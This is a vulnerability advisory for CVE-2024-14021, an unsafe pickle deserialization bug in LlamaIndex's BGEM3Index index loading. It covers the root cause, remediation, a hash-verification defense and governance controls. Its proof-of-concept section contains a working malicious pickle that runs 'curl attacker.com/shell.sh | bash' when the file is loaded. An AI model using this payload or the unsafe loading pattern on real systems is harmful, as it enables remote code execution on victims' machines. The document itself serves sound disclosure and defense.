# CVE-2024-14021: LlamaIndex BGEM3Index Unsafe Deserialization (CVSS 8.4)

## Quick Reference

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-14021 |
| **Framework** | LlamaIndex |
| **Affected Versions** | <= 0.11.6 |
| **Fixed Version** | > 0.11.6 |
| **CVSS Score** | 8.4 (High) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Attack Vector** | Local (malicious index file) |
| **Disclosed** | 2024 |

## Summary

LlamaIndex versions up to 0.11.6 contain an unsafe deserialization vulnerability in the `BGEM3Index.load_from_disk()` function. The function loads `multi_embed_store.pkl` using `pickle.load()` without any validation, allowing arbitrary code execution when loading indexes from untrusted directories.

**Attack scenario:** An attacker provides a malicious persist directory (via shared storage, download, or social engineering). When the victim loads the index, the crafted pickle file executes arbitrary code.

## Technical Details

**Vulnerable Component:** `BGEM3Index.load_from_disk()` in `llama_index/indices/managed/bge_m3/base.py`

**Root Cause:** The function directly calls `pickle.load()` on `multi_embed_store.pkl` from a user-supplied `persist_dir` without any validation or sandboxing.

**Vulnerable Code Pattern:**
```python
# Conceptual vulnerable pattern
def load_from_disk(persist_dir):
    with open(f"{persist_dir}/multi_embed_store.pkl", "rb") as f:
        embed_store = pickle.load(f)  # Unsafe!
    return embed_store
```

**Attack Pattern:**
1. Attacker creates a malicious persist directory with crafted `multi_embed_store.pkl`
2. Attacker distributes the directory (shared drive, download link, Git repo)
3. Victim calls `BGEM3Index.load_from_disk(attacker_persist_dir)`
4. Pickle deserialization executes attacker's code

## Proof of Concept

Creating a malicious index directory:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Create malicious persist directory
os.makedirs("malicious_index", exist_ok=True)
with open("malicious_index/multi_embed_store.pkl", "wb") as f:
    pickle.dump(Exploit(), f)

# When victim runs:
# index = BGEM3Index.load_from_disk("malicious_index")
# Code execution occurs
```

## Remediation

### Immediate Actions

1. **Upgrade LlamaIndex:**
   ```bash
   pip install llama-index>0.11.6
   ```

2. **Never load indexes from untrusted sources:**
   - Only load from directories you created
   - Verify the source of any shared index directories
   - Do not download pre-built indexes from untrusted locations

3. **If using older versions:**
   - Audit all `load_from_disk()` calls
   - Implement directory allowlisting
   - Consider sandboxing index loading operations

### Defense in Depth

```python
import hashlib

TRUSTED_INDEX_HASHES = {
    "production_index": "sha256:abc123..."
}

def safe_load_index(persist_dir, expected_hash):
    """Load index only if hash matches trusted value."""
    pkl_path = f"{persist_dir}/multi_embed_store.pkl"

    with open(pkl_path, "rb") as f:
        actual_hash = f"sha256:{hashlib.sha256(f.read()).hexdigest()}"

    if actual_hash != expected_hash:
        raise ValueError(f"Index hash mismatch: {actual_hash}")

    return BGEM3Index.load_from_disk(persist_dir)
```

## GRC Implications

### Risk Assessment

**Risk Level:** HIGH - Local attack vector but easy to exploit

**Impact Scenarios:**
- Compromised ML pipelines when loading shared indexes
- Supply chain attacks via malicious pre-built indexes
- Lateral movement from development to production systems

### Vendor Assessment Questions

If evaluating vendors using LlamaIndex:

1. "What version of LlamaIndex are you running?"
2. "Do you use the BGEM3Index component?"
3. "Where do your index persist directories come from?"
4. "How do you validate the integrity of loaded indexes?"
5. "Are you aware of CVE-2024-14021 and have you patched?"

### Control Recommendations

| Control | Description | Priority |
|---------|-------------|----------|
| Upgrade LlamaIndex | Update to version > 0.11.6 | Critical |
| Source validation | Only load indexes from trusted sources | Critical |
| Hash verification | Verify index file integrity before loading | High |
| Sandboxing | Isolate index loading in containers | Medium |
| Monitoring | Alert on unexpected index directory access | Medium |

### Policy Implications

- "Pre-built indexes and embedding stores must not be loaded from untrusted sources"
- "Index files should be treated with the same security controls as executable code"
- "Shared ML artifacts require integrity verification before use"

## References

- [VulnCheck Advisory](https://www.vulncheck.com/advisories/llamaindex-bgem3index-unsafe-deserialization)
- [Tenable CVE Entry](https://www.tenable.com/cve/CVE-2024-14021)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-14021)
- [Huntr Disclosure](https://huntr.com/bounties/ab4ceeb4-aa85-4d1c-aaca-4eda1b71fc12)

## Timeline

| Date | Event |
|------|-------|
| 2024-XX-XX | Discovered by LifeTeam2024 |
| 2024-XX-XX | Reported via Huntr |
| 2024-XX-XX | Fix released in LlamaIndex > 0.11.6 |

---

*Last updated: 2026-01-18*

*Tags: `llamaindex` `high` `cvss-8` `local` `index-loading` `embedding-store`*
